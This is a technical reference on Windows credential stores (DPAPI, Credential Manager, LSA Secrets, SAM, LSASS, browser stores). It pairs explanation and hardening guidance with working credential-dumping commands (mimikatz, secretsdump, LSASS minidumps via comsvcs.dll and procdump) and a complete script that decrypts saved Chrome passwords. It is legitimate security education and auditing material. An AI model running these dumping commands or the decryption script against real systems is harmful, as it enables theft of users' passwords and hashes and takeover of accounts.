---
title: "Windows - Credential Manager and LSA Secrets"
date: "2026-05-15"
---

Windows stores credentials in several places: Credential Manager (for user passwords), LSA Secrets (for system secrets and service accounts), SAM (for local accounts), and LSASS (in RAM). Understanding where each type lives, how it is encrypted, and how it can be extracted is fundamental to both securing systems and conducting security audits.

---

## Credentials Storage Map

```
Where Windows stores secrets:

LSASS (memory)
├── NT Hashes of active (logged-in) users
├── Kerberos TGT and TGS tickets
├── Kerberos session keys (AES/RC4)
├── Plaintext passwords (WDigest, if enabled)
└── DPAPI master keys for the session

SAM (registry: HKLM\SAM)
├── NT Hashes of local users
└── LM Hashes (if not disabled)

LSASS Secrets / LSA Secrets (registry: HKLM\SECURITY)
├── Service account passwords (Services: section)
├── Cached Domain Credentials (NL$KM key + DCC2 hashes)
├── DPAPI System master key (DPAPI_SYSTEM)
├── Machine Account password (domain-joined computers)
└── SCM secrets and other system secrets

Credential Manager (filesystem)
├── Windows Credentials
│   ├── Network credentials (shares, servers)
│   └── Certificates
└── Generic Credentials
    ├── User applications (Teams, GitHub, VS Code)
    └── Saved browser passwords (Internet Explorer / Edge legacy)

Browsers (separate storage)
├── Chrome: SQLite + DPAPI (Local State + Login Data)
├── Edge: same as Chrome
├── Firefox: NSS key store (key4.db + logins.json)
└── Internet Explorer: CryptProtectData in the registry

Credential Vault (physical files)
├── %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\
├── %USERPROFILE%\AppData\Local\Microsoft\Credentials\
└── %SYSTEMROOT%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
```

---

## DPAPI - the Foundation of Credential Encryption

```
DPAPI (Data Protection API) - the cryptographic subsystem that underpins
the protection of most credential stores in Windows.
Applications call CryptProtectData() and Windows encrypts the data,
binding it to the user account. No need to implement your own crypto.

DPAPI key hierarchy:

User password
    ↓ PBKDF2 / SHA1
User SID + Prekey
    ↓
Master Key (256 bits, valid 90 days)
    ↓ stored at %APPDATA%\Microsoft\Protect\<SID>\
    ↓ encrypted as SHA1(password + SID)
    ↓
Encryption Key (per-blob session key)
    ↓
Encrypted Blob (output of CryptProtectData)

Where Master Keys are stored:
User:   %USERPROFILE%\AppData\Roaming\Microsoft\Protect\<SID>\
        (files named {GUID})
System: %WINDIR%\System32\Microsoft\Protect\S-1-5-18\User\
        HKLM\SECURITY\Policy\Secrets\DPAPI_SYSTEM (LSA Secret)

Master Key file:
  Encrypted with SHA1(user_password + user_SID) → AES-256 / 3DES
  Backup copy: stored on DC in AD (attribute msKds-KeyVersion)

How encryption works:
  1. Application calls CryptProtectData(plaintext, entropy, ...)
  2. DPAPI takes the current Master Key (decrypting it with the password)
  3. Generates a session key
  4. Encrypts the data with the session key
  5. Returns a Blob: {Master Key GUID} + {encrypted data}

How decryption works:
  1. Application calls CryptUnprotectData(blob)
  2. DPAPI reads Master Key GUID from the Blob
  3. Opens the corresponding Master Key file
  4. Decrypts the master key using the user's password (already in memory)
  5. Decrypts the data
  6. Returns plaintext

Critical implication:
  If an attacker has the Master Key (and/or the user's password) -
  they can decrypt ALL DPAPI-protected data for that user:
  Credential Manager, browser passwords, certificates, WiFi keys, etc.
```

### DPAPI Backup via DC

```
In a domain environment, Master Keys are backed up to the DC.
This allows credential recovery when a user changes their password.

Mechanism (Domain Backup Key):
  When DPAPI is first used in the domain, a Domain DPAPI Backup Key (RSA-2048)
  is generated and stored in AD.
  
  Each Master Key is also encrypted with the Domain Backup Key.
  If a user changes their password - the Master Key can be decrypted
  using the Domain Backup Key (stored at HKLM\SECURITY\Policy\Secrets\G$BCKUPKEY_*)

  This means: controlling the DC, you can decrypt DPAPI data for ANY domain user.
  Tool: Mimikatz → lsadump::backupkeys / dpapi::masterkey /rpc

Extract Domain Backup Key (requires DA or SYSTEM on DC):
  mimikatz# lsadump::backupkeys /system:dc01.contoso.com /export

  # Then decrypt any user's master key:
  mimikatz# dpapi::masterkey /in:"{GUID}" /pvk:ntds_capi_0_backup.pvk
```

---

## Credential Manager

### Architecture and Types

```
Credential Manager - the user-level credential store in Windows.
GUI: Control Panel → Credential Manager
     (or: rundll32.exe keymgr.dll, KRShowKeyMgr)
PowerShell: no built-in module (use .NET or cmdkey.exe)

Three categories:

Windows Credentials:
  - NTLM/Kerberos credentials for network resources
  - Saved passwords for servers, domains, shares
  - Target format: MicrosoftOffice*, MicrosoftSkype*, \\server\share, etc.
  - Stored as Windows Vault entries
  - Encrypted: CryptProtectData (user DPAPI)

Certificate-Based Credentials:
  - Client certificates for authentication
  - Rarely used directly by users

Generic Credentials:
  - Credentials for applications (non-Windows protocols)
  - Examples: GitHub Desktop, Teams, Visual Studio, Edge
  - Format: arbitrary (application-defined)
  - Encrypted: CryptProtectData (user DPAPI)

Physical location of Vault files:
  %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\
  %USERPROFILE%\AppData\Local\Microsoft\Credentials\
  C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
  C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials\

File format:
  Binary VAULT format (Credential Vault Entry)
  Header with Master Key GUID + encrypted payload
  Cannot be read as plaintext
```

### Managing via cmdkey.exe

```
cmdkey - built-in tool to manage Credential Manager from the command line.

View saved credentials:
  cmdkey /list
  cmdkey /list:targetname     # filter by target name

  Sample output:
    Currently stored credentials:

    Target: Domain:interactive=CONTOSO\alice
    Type: Domain Password
    User: CONTOSO\alice

    Target: MicrosoftOffice16_Data:SSPI:user@contoso.com
    Type: Generic
    User: user@contoso.com

Add credentials:
  cmdkey /add:servername /user:DOMAIN\username /pass:password
  cmdkey /add:192.168.1.10 /user:Administrator /pass:P@ssw0rd

  # Generic (applications):
  cmdkey /generic:targetname /user:username /pass:password

  # Domain authentication:
  cmdkey /add:domain.com /user:DOMAIN\user /pass:password

Delete credentials:
  cmdkey /delete:servername
  cmdkey /delete:MicrosoftOffice16_Data:SSPI:user@contoso.com

Practical scenario - runas with saved credentials:
  cmdkey /add:server01 /user:DOMAIN\admin /pass:AdminP@ss
  runas /user:DOMAIN\admin /savecred "notepad.exe"
  # After first password entry, /savecred stores it in Credential Manager
```

### Managing via PowerShell (.NET)

```
PowerShell has no native cmdlets for Credential Manager,
but you can use Win32 API via P/Invoke or third-party modules.

Option 1: CredentialManager module (from PSGallery):
  Install-Module -Name CredentialManager -Force

  # Get all credentials
  Get-StoredCredential | Select-Object TargetName, Type, UserName

  # Get credentials for a specific target (including password)
  $cred = Get-StoredCredential -Target "servername" -AsCredentialObject
  $cred.GetNetworkCredential().Password

  # Save credentials
  New-StoredCredential -Target "servername" -UserName "user" -Password "pass" -Type Generic

  # Delete
  Remove-StoredCredential -Target "servername"

Option 2: Directly via Windows API (P/Invoke):
  $code = @"
  using System;
  using System.Runtime.InteropServices;
  using System.Text;

  public class CredManager {
      [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
      static extern bool CredRead(string target, CRED_TYPE type, int reservedFlag, out IntPtr credentialPtr);

      [DllImport("advapi32.dll")]
      static extern void CredFree(IntPtr buffer);

      [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
      struct CREDENTIAL {
          public uint Flags;
          public CRED_TYPE Type;
          public string TargetName;
          public string Comment;
          public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
          public uint CredentialBlobSize;
          public IntPtr CredentialBlob;
          public uint Persist;
          public uint AttributeCount;
          public IntPtr Attributes;
          public string TargetAlias;
          public string UserName;
      }

      public enum CRED_TYPE : uint {
          Generic = 1,
          DomainPassword = 2,
          DomainCertificate = 3,
      }

      public static string GetPassword(string target) {
          IntPtr credPtr;
          if (CredRead(target, CRED_TYPE.Generic, 0, out credPtr)) {
              var cred = Marshal.PtrToStructure<CREDENTIAL>(credPtr);
              var password = Marshal.PtrToStringUni(cred.CredentialBlob, (int)cred.CredentialBlobSize / 2);
              CredFree(credPtr);
              return password;
          }
          return null;
      }
  }
  "@
  Add-Type -TypeDefinition $code
  [CredManager]::GetPassword("targetname")

Option 3: vaultcmd.exe (built into Windows):
  vaultcmd /listschema          # vault schemas
  vaultcmd /list                # list vaults
  vaultcmd /listcreds:"Windows Credentials"   # vault contents
```

### AutoLogon and Credential Manager

```
Windows AutoLogon stores credentials in the registry (not Credential Manager):
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
    DefaultUserName      = username
    DefaultPassword      = password (plaintext!)
    AutoAdminLogon       = 1 (enabled)
    DefaultDomainName    = domain name

These values are NOT encrypted - stored in plaintext!
Any local administrator can read them.

Check:
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
    Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon

Safer alternative:
  Sysinternals AutoLogon.exe - encrypts password via DPAPI (still vulnerable under SYSTEM).
  Best practice: avoid AutoLogon on domain workstations entirely.
```

---

## LSA Secrets

### What Are LSA Secrets

```
LSA Secrets - a protected storage area inside the Windows kernel for system secrets.
Managed by LSA (Local Security Authority) via lsasrv.dll.
Inaccessible to users and most applications.
Requires SYSTEM privileges to read (not Administrator, but SYSTEM).

Physical location:
  Registry: HKLM\SECURITY\Policy\Secrets\
  This key is inaccessible even to Administrator directly:
    reg query HKLM\SECURITY  → "Access Denied"
    Key permissions: only SYSTEM has Full Control

Key structure (HKLM\SECURITY\Policy\Secrets\):
  <SecretName>\
      CurrVal    - current encrypted value
      OldVal     - previous encrypted value
      CupdTime   - time of last update
      OupdTime   - time of previous update

LSA Secrets encryption:
  Vista and earlier: RC4 with SYSTEM bootstrap key
  Windows 7+:        AES-256 in CBC mode

  Encryption keys:
    HKLM\SECURITY\Policy\PolEKList  - LSA encryption key
    This key is encrypted with the Boot Key (Syskey)
    Boot Key is derived from four registry values:
      HKLM\SYSTEM\CurrentControlSet\Control\Lsa\
        JD, Skew1, GBG, Data  (4 bytes each, scrambled)
```

### What is Stored in LSA Secrets

```
Standard LSA Secrets:

$MACHINE.ACC
  - Machine Account password (computer account in the domain)
  - Automatically updated every 30 days
  - Used for computer authentication in the domain (Kerberos + NTLM)
  - The NT Hash of this password = the machine's NT Hash = usable for Pass-the-Hash

_SC_<ServiceName>
  - Service account password for each service
  - Format: _SC_wuauserv, _SC_MSSQLServer, _SC_Spooler, etc.
  - Present when a service is configured to run as "This account" (not Local System)
  - Contains the plaintext password of the service account!

DefaultPassword
  - AutoLogon password (if configured via LSA Secrets rather than the registry)
  - Plaintext

NL$KM
  - Encryption key for Cached Domain Credentials (DCC/MSCache)
  - Used to encrypt cached login hashes
  - If captured, allows decryption of all cached credentials

DPAPI_SYSTEM
  - System DPAPI Master Key
  - Used to decrypt DPAPI data belonging to system accounts
  - (Local System, Local Service, Network Service)

G$BCKUPKEY_<GUID>
  - Domain DPAPI Backup Key (DC only)
  - RSA private key for recovering DPAPI data for any domain user
  - The most valuable secret on a DC!

RasDialParams and RasCredentials
  - Credentials for VPN/RAS connections (if configured system-wide)

SCM:{<GUID>}
  - Additional Service Control Manager secrets

L$<name>
  - Arbitrary LSA secrets created by applications
```

### How to Extract LSA Secrets

```
Extraction requires SYSTEM privileges (not just Administrator).
Ways to get SYSTEM: PsExec -s, scheduled task, or already being SYSTEM.

Method 1: Via registry hives (offline)
  Requires: physical access or backup (Volume Shadow Copy)
  
  Save the hives (cannot simply copy the files while Windows is running):
    reg save HKLM\SECURITY security.hive
    reg save HKLM\SYSTEM system.hive
    reg save HKLM\SAM sam.hive

  Extract from offline hives (e.g. impacket):
    secretsdump.py -system system.hive -security security.hive -sam sam.hive LOCAL

Method 2: Via Volume Shadow Copy (online, no system shutdown needed)
  List existing shadows:
    vssadmin list shadows
  Create a shadow:
    wmic shadowcopy call create Volume="C:\"

  Copy files from the shadow:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY .
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .

Method 3: Mimikatz (online, requires SYSTEM or SeDebugPrivilege)
  Run mimikatz as SYSTEM:
    PsExec64.exe -s mimikatz.exe

  In mimikatz:
    mimikatz# privilege::debug
    mimikatz# token::elevate        # get SYSTEM token
    mimikatz# lsadump::secrets      # dump LSA Secrets
    mimikatz# lsadump::sam          # dump SAM hashes
    mimikatz# lsadump::cache        # dump cached credentials

Method 4: Impacket (remote, requires Admin credentials)
  secretsdump.py DOMAIN/Administrator:P@ssword@TARGET
  secretsdump.py -hashes :NTHash DOMAIN/Administrator@TARGET   # Pass-the-Hash

  Sample output:
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC
    CONTOSO\WORKSTATION01$:aes256-cts-hmac-sha1-96:abcdef...
    CONTOSO\WORKSTATION01$:plain_password_hex:...
    [*] NL$KM
    NL$KM:hex...
```

---

## Cached Domain Credentials (DCC / MSCache)

```
DCC (Domain Cached Credentials, also MSCache or Domain Cached Logon) -
mechanism for caching domain user credentials on the local machine.

Why a cache is needed:
  If the DC is unreachable (offline laptop, network outage) -
  the user can still log in using cached credentials.

Where it is stored:
  Registry: HKLM\SECURITY\Cache\
            (inaccessible to Administrator, SYSTEM only)
  Values: NL$1, NL$2, ..., NL$10  (10 entries by default)

Hashing algorithm:
  MSCacheV1 (Windows 2000 - XP):
    DCC = MD4(MD4(UTF-16LE(password)) + UTF-16LE(lowercase(username)))
    
  MSCacheV2 / DCC2 (Vista and newer):
    DCC2 = PBKDF2(HMAC-SHA1, MSCacheV1, username, 10240 iterations)
    
  Key difference of DCC2 vs NT Hash:
    10240 iterations → cracking is 10000x+ slower than NT Hash
    Practical GPU speed (RTX 3090): ~200M/sec vs 70B/sec for NT Hash

Cache entry format:
  Encrypted: AES-256 with NL$KM key (LSA Secret)
  After decryption: {DCC2 hash}{username}{domain}{...metadata}

Configure number of cached entries:
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
    CachedLogonsCount = 10  (default)

  # Disable cache (set to 0):
  Set-ItemProperty `
      -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
      -Name "CachedLogonsCount" `
      -Value "0"

  # Via GPO:
  Computer Config → Windows Settings → Security Settings → Local Policies → Security Options
  "Interactive logon: Number of previous logons to cache" = 0
  (Risk: if DC is unreachable - users will not be able to log in)

Attacking the cache:
  1. Extract encrypted cache + NL$KM via LSA Secrets dump
  2. Decrypt with NL$KM → get DCC2 hashes
  3. Crack DCC2 with dictionary/brute-force attacks
  4. DCC2 CANNOT be used directly as Pass-the-Hash!
     (only the plaintext password or NT Hash works for PtH)

Hashcat format (mode 2100):
  $DCC2$10240#username#hash
```

---

## SAM - Security Account Manager

```
SAM - the local user account database in Windows.
Physical file: C:\Windows\System32\config\SAM
Registry hive: HKLM\SAM

Contains:
  - NT Hashes of local users
  - LM Hashes (if not disabled via NoLMHash)
  - Account metadata (flags, last logon, etc.)
  - Passwords are never stored in plaintext - only hashes

SAM encryption:
  Pre-Vista: ROT-13 / DES (weak)
  Vista+:    AES-128 with SYSKEY (Boot Key)
  
  SYSKEY (System Key) - 128-bit key stored across four registry values:
    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\
      JD, Skew1, GBG, Data
    (each holds part of the key, scrambled in a specific way)

Why you cannot simply copy the SAM file:
  The file is locked by the system while Windows is running
  Solution: Volume Shadow Copy or offline access (WinPE, another OS)

Dump SAM via registry (requires SYSTEM):
  reg save HKLM\SAM C:\Temp\sam.hive
  reg save HKLM\SYSTEM C:\Temp\system.hive
  
  # Then offline:
  impacket-secretsdump -system system.hive -sam sam.hive LOCAL
  # Or: Mimikatz: lsadump::sam

Dump output format:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
  Format: username:RID:LM_hash:NT_hash:::
  
  aad3b435b51404eeaad3b435b51404ee = LM hash of empty password (LM is disabled)
  8846f7eaee8fb117ad06bdd830b7586c = NT hash of "password"

RID values in SAM:
  500 = Administrator (built-in, cannot be deleted)
  501 = Guest
  503 = DefaultAccount
  1000+ = created users
```

---

## LSASS - Credentials in Memory

```
LSASS (Local Security Authority Subsystem Service) - the lsass.exe process.
Holds credentials of ACTIVE (logged-in) users in memory.

What LSASS holds:
  NT Hash (always)
  Kerberos TGT and session keys
  Kerberos TGS tickets (per service)
  Plaintext passwords via WDigest (if enabled)
  DPAPI master keys (to decrypt DPAPI data)
  NTLM challenge-response keys

WDigest (legacy protocol):
  Windows XP - 8.1: stored plaintext passwords in LSASS for HTTP Digest auth
  
  Defaults:
    Windows 8.1 / 2012 R2+: WDigest disabled (does not store plaintext)
    Windows 7 / 2008 R2 and older: WDigest enabled!
  
  Enable/Disable WDigest:
    # Disable (don't store plaintext):
    Set-ItemProperty `
        -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -Value 0
    
    # Enable (WARNING: INSECURE):
    Set-ItemProperty `
        -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -Value 1
    
    # Takes effect after the user logs back in

Dumping LSASS memory:
  Method 1: Task Manager (GUI)
    Details → lsass.exe → right-click → Create Dump File
    (creates minidump in %TEMP%, requires Administrator)

  Method 2: comsvcs.dll (LOLBin - Living Off the Land)
    # Via rundll32 (bypasses some AV)
    # Requires SYSTEM or SeDebugPrivilege
    $lsassPID = (Get-Process lsass).Id
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Temp\lsass.dmp full

  Method 3: procdump.exe (Sysinternals)
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    procdump.exe -accepteula -ma -64 lsass.exe lsass.dmp  # x64

  Method 4: ProcExp (Sysinternals Process Explorer)
    Right-click lsass.exe → Create Dump → Mini Dump

  Parse dump with Mimikatz:
    mimikatz# sekurlsa::minidump lsass.dmp
    mimikatz# sekurlsa::logonpasswords    # show credentials
    mimikatz# sekurlsa::wdigest           # WDigest (plaintext)
    mimikatz# sekurlsa::kerberos          # Kerberos TGT/TGS
    mimikatz# sekurlsa::dpapi             # DPAPI master keys

  Parse dump with pypykatz (Python, Linux):
    pypykatz lsa minidump lsass.dmp
```

### Protecting LSASS

```
1. Credential Guard (best protection)
   Moves credentials into Isolated LSA (LSAIso) - a Hyper-V based VM.
   Even a compromised kernel cannot read from LSAIso.
   
   Requirements: UEFI Secure Boot, TPM, Intel VT-x / AMD-V, Windows 10+ Enterprise
   
   Enable via GPO:
     Computer Config → Admin Templates → System → Device Guard
     "Turn on Virtualization Based Security" = Enabled
     "Credential Guard Configuration" = Enabled with UEFI lock
   
   Enable via registry:
     New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
         -Name "EnableVirtualizationBasedSecurity" -Value 1 -PropertyType DWORD
     New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
         -Name "LsaCfgFlags" -Value 1 -PropertyType DWORD
     # 1 = enable with UEFI lock, 2 = enable without lock

2. PPL (Protected Process Light) for LSASS
   LSASS runs as a Protected Process Light - other processes cannot
   ReadProcessMemory even with SeDebugPrivilege.
   
   Enable:
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
         -Name "RunAsPPL" -Value 1 -PropertyType DWORD
     # Requires reboot
     # Requires Secure Boot (otherwise can be disabled via registry)
   
   Verify:
     Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" RunAsPPL
     # 1 = enabled; should be protected by UEFI variables

3. Check Credential Guard status
   msinfo32.exe → "Virtualization-based security"
   "Services Running" should include "Credential Guard"

4. Restrict SeDebugPrivilege
   By default only Administrator has SeDebugPrivilege in an elevated session.
   Remove it even from Administrators (aggressive - may break some tools):
     GPO: Computer Config → Windows Settings → Security Settings
     → Local Policies → User Rights Assignment
     → Debug programs - remove Administrators

5. Windows Defender Attack Surface Reduction (ASR)
   Rule: "Block credential stealing from the Windows local security authority subsystem"
   GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0
   
   PowerShell:
     Add-MpPreference -AttackSurfaceReductionRules_Ids `
         "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0" `
         -AttackSurfaceReductionRules_Actions Enabled
```

---

## Browser Credentials

### Chrome / Edge (Chromium)

```
Chrome stores passwords in a SQLite database encrypted with DPAPI.

File locations:
  Chrome passwords: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
  Edge passwords:   %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
  Encryption key:   %LOCALAPPDATA%\Google\Chrome\User Data\Local State

Encryption structure (Chrome v80+):
  AES-256-GCM with a key stored in Local State (JSON):
    "os_crypt": { "encrypted_key": "<base64>" }
  encrypted_key = DPAPI(DPAPIPREFIX + AES_key)
  
  Decryption algorithm:
    1. Read encrypted_key from Local State
    2. Base64-decode → strip "DPAPI" prefix (5 bytes)
    3. CryptUnprotectData → get AES key
    4. Open Login Data (SQLite): SELECT origin_url, username_value, password_value FROM logins
    5. password_value = "v10" + nonce(12 bytes) + ciphertext + tag(16 bytes)
    6. AES-256-GCM decrypt(key, nonce, ciphertext) → plaintext password

Decryption script (Python):
  import sqlite3, json, base64, win32crypt
  from Crypto.Cipher import AES
  import shutil, os

  def get_chrome_key():
      local_state_path = os.path.join(os.environ['LOCALAPPDATA'],
          r'Google\Chrome\User Data\Local State')
      with open(local_state_path, 'r', encoding='utf-8') as f:
          local_state = json.load(f)
      encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
      encrypted_key = encrypted_key[5:]  # strip DPAPI prefix
      return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

  def decrypt_password(ciphertext, key):
      try:
          nonce = ciphertext[3:15]
          ciphertext_body = ciphertext[15:]
          cipher = AES.new(key, AES.MODE_GCM, nonce)
          return cipher.decrypt(ciphertext_body)[:-16].decode('utf-8')
      except:
          return ""

  def get_chrome_passwords():
      key = get_chrome_key()
      db_path = os.path.join(os.environ['LOCALAPPDATA'],
          r'Google\Chrome\User Data\Default\Login Data')
      tmp_db = os.path.join(os.environ['TEMP'], 'tmp_login_data')
      shutil.copy2(db_path, tmp_db)  # copy because Chrome locks the file
      
      conn = sqlite3.connect(tmp_db)
      cursor = conn.cursor()
      cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
      
      for url, username, encrypted_pw in cursor.fetchall():
          pw = decrypt_password(encrypted_pw, key)
          if pw:
              print(f"URL: {url} | User: {username} | Pass: {pw}")
      conn.close()
      os.remove(tmp_db)

  get_chrome_passwords()
```

### Firefox

```
Firefox uses its own NSS (Network Security Services) store.

Profile files:
  %APPDATA%\Mozilla\Firefox\Profiles\<profile>\
    key4.db     - NSS key database (SQLite / SQLCipher)
    logins.json - encrypted credentials
    cert9.db    - certificates

Encryption structure:
  Master password (if set) → PBKDF2 → NSS key
  Without a master password: empty string is used → weak protection
  
  logins.json contains:
    encryptedUsername: base64(ASN1(SEC_PKCS7_ENVELOPE(username)))
    encryptedPassword: same
    
  Encryption: 3DES-CBC (via NSS PKCS#7 envelope)

Firefox master password = the only real protection.
Without it, all saved passwords are vulnerable.

Tools:
  firefox_decrypt (Python): python firefox_decrypt.py /path/to/profile
  firepwd.py: works with key4.db and logins.json
```

---

## Credential Protection Recommendations

### Technical Controls

```
Level 1: Baseline (mandatory)

  Disable WDigest:
    Set-ItemProperty "HKLM:\SYSTEM\...\WDigest" UseLogonCredential 0

  Enable PPL for LSASS:
    Set-ItemProperty "HKLM:\SYSTEM\...\Lsa" RunAsPPL 1

  Disable credential cache (if DC is always reachable):
    Set-ItemProperty "HKLM:\SOFTWARE\...\Winlogon" CachedLogonsCount 0

  Enable SMB Signing:
    Set-ItemProperty "HKLM:\SYSTEM\...\LanmanServer\Parameters" RequireSecuritySignature 1

  Remove AutoLogon:
    Remove-ItemProperty "HKLM:\SOFTWARE\...\Winlogon" DefaultPassword (if present)

Level 2: Advanced

  Credential Guard:
    Requires UEFI + TPM + Enterprise license
    Isolates LSASS in a Hyper-V container

  Protected Users Security Group:
    For all privileged accounts (Domain Admins, Schema Admins, etc.)
    Disables NTLM, caching, and delegation

  LAPS (Local Administrator Password Solution):
    Unique local admin passwords per machine
    Eliminates lateral movement via local admin credentials

  ASR rule against LSASS dumping:
    GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0

Level 3: Maximum

  Privileged Access Workstations (PAW):
    Dedicated machines for administrative tasks only

  Just-In-Time (JIT) access:
    Privileges granted on a time-limited basis (Microsoft PAM / CyberArk)

  Tiered Administration Model:
    Tier 0: DC / PKI / Identity (only from Tier 0 machines)
    Tier 1: Servers (only from Tier 1 machines)
    Tier 2: Workstations (only from Tier 2 machines)

  Smart Card / Hardware Token authentication:
    Hardware token required for all privileged logons
```

### Auditing and Monitoring

```
Key Event IDs for credentials monitoring:

  4624 - Successful logon
    Type 2 = interactive (physical)
    Type 3 = network (SMB, WinRM)
    Type 4 = batch (scheduled task)
    Type 5 = service (service account)
    Type 7 = unlock (screen unlock)
    Type 8 = NetworkCleartext (WDigest, BasicAuth)   ← alert!
    Type 9 = NewCredentials (runas /netonly)
    Type 10 = RemoteInteractive (RDP)

  4625 - Failed logon
    Status/SubStatus codes:
    0xC000006D - wrong username or auth protocol
    0xC000006A - wrong password
    0xC0000064 - username does not exist
    0xC000006F - logon not allowed at this time
    0xC0000070 - logon from this workstation not allowed

  4648 - Logon with explicit credentials (runas, runas /netonly)
  4672 - Special privileges at logon (SeDebugPrivilege, etc.)
  4720 - User account created
  4732 - Member added to Administrators group
  4776 - NTLM Credential Validation (on DC)
  4768 - TGT request (Kerberos AS-REQ)
  4769 - TGS request (Kerberos TGS-REQ)

  LSASS-specific:
  10 (Sysmon) - ProcessAccess (access to lsass.exe)
  Sysmon EventID 10 with TargetImage=lsass.exe = possible dump attempt!

PowerShell monitoring:
  # Find suspicious access to LSASS (Sysmon)
  Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
      Where-Object { $_.Id -eq 10 -and $_.Message -match "lsass" } |
      Select-Object TimeCreated, Message | Format-List

  # Find explicit credential logons (runas)
  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648} -MaxEvents 100 |
      Select-Object TimeCreated,
      @{N="TargetUser"; E={$_.Properties[5].Value}},
      @{N="TargetServer"; E={$_.Properties[8].Value}} |
      Format-Table -AutoSize

  # Suspicious WDigest logons (type 8)
  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
      Where-Object { $_.Properties[8].Value -eq 8 } |
      Select-Object TimeCreated, @{N="User"; E={$_.Properties[5].Value}}
```

---

## Quick Reference

```
CREDENTIAL STORE MAP
  LSASS (RAM)          - active credentials, TGT, DPAPI keys, WDigest
  SAM (registry)       - NT Hashes of local users
  LSA Secrets (registry)- service passwords, $MACHINE.ACC, NL$KM, DPAPI_SYSTEM
  Cached Creds (registry)- DCC2 hashes (cached domain logons)
  Credential Manager   - user credentials (DPAPI encrypted)
  Browsers             - passwords (DPAPI / NSS)

DPAPI KEY LOCATIONS
  User Master Key      - %APPDATA%\Microsoft\Protect\<SID>\{GUID}
  System Master Key    - %WINDIR%\System32\Microsoft\Protect\S-1-5-18\
  Domain Backup Key    - HKLM\SECURITY\Policy\Secrets\G$BCKUPKEY_* (DC only)

LSA SECRETS (key ones)
  $MACHINE.ACC         - machine account password (domain)
  _SC_<Service>        - service account password (plaintext!)
  NL$KM                - cache encryption key
  DPAPI_SYSTEM         - system DPAPI master key
  G$BCKUPKEY_*         - Domain DPAPI Backup Key (DC only)
  DefaultPassword      - AutoLogon password (plaintext!)

HASHES: CRACKING SPEED (RTX 3090 GPU)
  NT Hash (MD4)        - 70 billion/sec (critically fast)
  NTLMv2 response      - 5 billion/sec
  DCC2 (MSCache2)      - 200 million/sec (slower, but not uncrackable)

REGISTRY KEYS (PROTECTION)
  Disable WDigest:
    HKLM\SYSTEM\...\SecurityProviders\WDigest\UseLogonCredential = 0
  PPL for LSASS:
    HKLM\SYSTEM\...\Lsa\RunAsPPL = 1
  Credential Guard:
    HKLM\SYSTEM\...\DeviceGuard\EnableVirtualizationBasedSecurity = 1
    HKLM\SYSTEM\...\Lsa\LsaCfgFlags = 1
  AutoLogon (remove!):
    HKLM\SOFTWARE\...\Winlogon\DefaultPassword

CMDKEY COMMANDS
  cmdkey /list              - show all stored credentials
  cmdkey /add:server /user:u /pass:p   - add
  cmdkey /delete:target     - delete

EVENT IDs FOR MONITORING
  4624  - successful logon (type 8 = WDigest = plaintext risk)
  4625  - failed logon
  4648  - logon with explicit credentials
  4672  - logon with special privileges (SeDebug = suspicious)
  4776  - NTLM Credential Validation
  10 (Sysmon) - access to lsass.exe = possible dump!

PROTECTION PRIORITY
  1. Credential Guard      - isolates LSASS (best)
  2. PPL for LSASS         - blocks memory dump
  3. WDigest = 0           - no plaintext in memory
  4. Protected Users group - for privileged accounts
  5. LAPS                  - unique local admin passwords
  6. SMB Signing           - against relay attacks
  7. Disable LLMNR/NBT-NS  - remove relay attack vectors
```

---

## References

- [DPAPI internals](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/) - official DPAPI documentation
